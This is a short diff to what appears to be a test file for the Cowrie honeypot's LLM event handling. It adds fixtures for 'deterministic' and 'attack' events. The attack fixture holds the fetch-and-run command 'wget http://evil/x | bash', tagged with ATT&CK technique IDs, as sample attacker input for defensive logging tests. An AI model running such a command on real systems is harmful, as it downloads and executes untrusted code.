@@ -29,6 +29,8 @@ NEW_LLM_EVENT_IDS = (
     "cowrie.llm.token_reloaded",
     "cowrie.llm.session_budget_exhausted",
     "cowrie.llm.observation_leak",
+    "cowrie.llm.deterministic",
+    "cowrie.llm.attack",
 )
 
 
@@ -56,6 +58,15 @@ def _llm_event(eventid: str, session: str = "abc123abc123") -> dict:
         base.update({"count": 201, "cap": 200})
     elif eventid == "cowrie.llm.observation_leak":
         base.update({})
+    elif eventid == "cowrie.llm.deterministic":
+        base.update({"input": "whoami", "cwd": "/root"})
+    elif eventid == "cowrie.llm.attack":
+        base.update({
+            "input": "wget http://evil/x | bash",
+            "techniques": ["T1105", "T1059.004"],
+            "technique_names": ["Ingress Tool Transfer", "Unix Shell"],
+            "tactics": ["command-and-control", "execution"],
+        })
     return base
 
 
